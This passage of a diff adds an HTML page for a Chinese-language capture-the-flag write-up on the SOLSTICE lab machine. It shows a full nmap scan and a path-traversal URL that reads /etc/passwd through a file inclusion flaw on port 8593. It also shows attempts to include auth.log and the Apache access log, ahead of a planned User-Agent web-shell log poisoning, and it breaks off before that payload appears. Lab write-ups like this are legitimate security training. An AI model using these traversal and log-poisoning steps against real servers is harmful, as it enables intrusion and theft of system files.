+&lt;th>IP&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>Kali Linux&lt;/td>
+&lt;td>10.0.2.15&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>SOLSTICE&lt;/td>
+&lt;td>10.0.2.4&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;h2 id="初步打点">初步打点&lt;/h2>
+&lt;h3 id="端口扫描">端口扫描&lt;/h3>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">65
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">66
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">67
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">68
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">69
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">70
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">71
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">72
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">73
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">74
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">75
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">76
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">77
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">78
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">79
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">80
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">81
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">82
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ &lt;span style="color:#658b00">export&lt;/span> &lt;span style="color:#00688b">rip&lt;/span>=10.0.2.4
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ nmap -v -A -p- &lt;span style="color:#00688b">$rip&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE VERSION
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>21/tcp open ftp pyftpdlib 1.5.6
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| ftp-syst:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| STAT:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| FTP server status:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Connected to: 10.0.2.4:21
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Waiting &lt;span style="color:#8b008b;font-weight:bold">for&lt;/span> username.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| TYPE: ASCII; STRUcture: File; MODE: Stream
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Data connection closed.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_End of status.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| ssh-hostkey:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#b452cd">2048&lt;/span> 5b:a7:37:fd:55:6c:f8:ea:03:f5:10:bc:94:32:07:18 (RSA)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#b452cd">256&lt;/span> ab:da:6a:6f:97:3f:b2:70:3e:6c:2b:4b:0c:b7:f6:4c (ECDSA)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ &lt;span style="color:#b452cd">256&lt;/span> ae:29:d4:e3:46:a1:b1:52:27:83:8f:8f:b0:c4:36:d1 (ED25519)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>25/tcp open smtp Exim smtpd 4.92
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| smtp-commands: solstice Hello localhost [10.0.2.15], SIZE 52428800, 8BITMIME, PIPELINING, CHUNKING, PRDR, HELP
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http Apache httpd 2.4.38 ((Debian))
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: Apache/2.4.38 (Debian)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Site doesn&lt;span style="color:#cd5555">&amp;#39;t have a title (text/html).
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">| http-methods:
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">|_ Supported Methods: OPTIONS HEAD GET POST
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">445/tcp open netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">2121/tcp open ftp pyftpdlib 1.5.6
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">| ftp-syst:
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">| STAT:
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">| FTP server status:
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">| Connected to: 10.0.2.4:2121
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">| Waiting for username.
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">| TYPE: ASCII; STRUcture: File; MODE: Stream
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">| Data connection closed.
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">|_End of status.
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">|_drws------ 2 www-data www-data 4096 Jun 18 2020 pub
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">3128/tcp open http-proxy Squid http proxy 4.6
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">|_http-server-header: squid/4.6
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">|_http-title: ERROR: The requested URL could not be retrieved
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">8593/tcp open http PHP cli server 5.5 or later (PHP 7.3.14-1)
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">| http-methods:
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">|_ Supported Methods: GET HEAD POST OPTIONS
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">|_http-title: Site doesn&amp;#39;&lt;/span>t have a title (text/html; &lt;span style="color:#00688b">charset&lt;/span>=UTF-8).
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-cookie-flags:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| /:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| PHPSESSID:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ httponly flag not &lt;span style="color:#658b00">set&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>54787/tcp open http PHP cli server 5.5 or later (PHP 7.3.14-1)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Site doesn&lt;span style="color:#a61717;background-color:#e3d2d2">&amp;#39;&lt;/span>t have a title (text/html; &lt;span style="color:#00688b">charset&lt;/span>=UTF-8).
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-methods:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ Supported Methods: GET HEAD POST OPTIONS
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>62524/tcp open tcpwrapped
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Service Info: Host: solstice; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host script results:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_clock-skew: mean: 1h20m00s, deviation: 2h18m35s, median: 1s
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| nbstat: NetBIOS name: SOLSTICE, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Names:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| SOLSTICE&amp;lt;00&amp;gt; Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| SOLSTICE&amp;lt;03&amp;gt; Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| SOLSTICE&amp;lt;20&amp;gt; Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#cd5555">\x&lt;/span>01&lt;span style="color:#cd5555">\x&lt;/span>02__MSBROWSE__&lt;span style="color:#cd5555">\x&lt;/span>02&amp;lt;01&amp;gt; Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| WORKGROUP&amp;lt;00&amp;gt; Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| WORKGROUP&amp;lt;1d&amp;gt; Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ WORKGROUP&amp;lt;1e&amp;gt; Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| smb-os-discovery:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| OS: Windows 6.1 (Samba 4.9.5-Debian)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Computer name: &lt;span style="color:#cd5555">\x&lt;/span>&lt;span style="color:#b452cd">00&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| NetBIOS computer name: SOLSTICE&lt;span style="color:#cd5555">\x&lt;/span>&lt;span style="color:#b452cd">00&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Workgroup: WORKGROUP&lt;span style="color:#cd5555">\x&lt;/span>&lt;span style="color:#b452cd">00&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| smb2-security-mode:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| 3.1.1:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ Message signing enabled but not required
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| smb2-time:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ start_date: N/A
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| smb-security-mode:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| account_used: guest
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| authentication_level: user
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| challenge_response: supported
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ message_signing: disabled (dangerous, but default)
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="web测试">WEB测试&lt;/h3>
+&lt;p>发现web端口，优先进行web漏洞测试&lt;/p>
+&lt;ul>
+&lt;li>80端口没发现啥问题，纯粹是个兔子洞，那个&lt;code>phpIPAM&lt;/code>最后进系统一看，各种空文件&lt;/li>
+&lt;li>8593端口存在本地文件包含漏洞，应该是这里搞突破了&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a61717;background-color:#e3d2d2">http://10.0.2.4:8593/index.php?book=/../../../../../etc/passwd
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="漏洞发现">漏洞发现&lt;/h3>
+&lt;p>于是想包含apache2日志或者auth.log&lt;/p>
+&lt;p>试图包含 &lt;a href="http://10.0.2.4:8593/index.php?book=/../../../../../var/log/auth.log">http://10.0.2.4:8593/index.php?book=/../../../../../var/log/auth.log&lt;/a>发现包含失败，应该是权限不够。&lt;/p>
+&lt;p>试图包含 &lt;a href="http://10.0.2.4:8593/index.php?book=/../../../../../var/log/apache2/access.log%E5%8F%91%E7%8E%B0%E6%97%A5%E5%BF%97%E6%9C%AA%E5%86%99%E5%85%A5%EF%BC%8C%E6%B5%8B%E8%AF%9580%E5%92%8C54787">http://10.0.2.4:8593/index.php?book=/../../../../../var/log/apache2/access.log发现日志未写入，测试80和54787&lt;/a> web应用，访问&lt;/p>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a61717;background-color:#e3d2d2">http://10.0.2.4:80/p80
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a61717;background-color:#e3d2d2">http://10.0.2.4:54787/p54787
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>发现对&lt;a href="http://10.0.2.4:80">http://10.0.2.4:80&lt;/a>的访问会写入&lt;code>/var/log/apache2/access.log&lt;/code>日志。&lt;/p>
+&lt;h2 id="获得权限">获得权限&lt;/h2>
+&lt;h3 id="本地测试">本地测试&lt;/h3>
+&lt;p>本地启动&lt;code>/etc/init.d/apache2 start&lt;/code>&lt;/p>
+&lt;p>测试 将一句话通过user-agent写入apache2日志文件&lt;/p>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
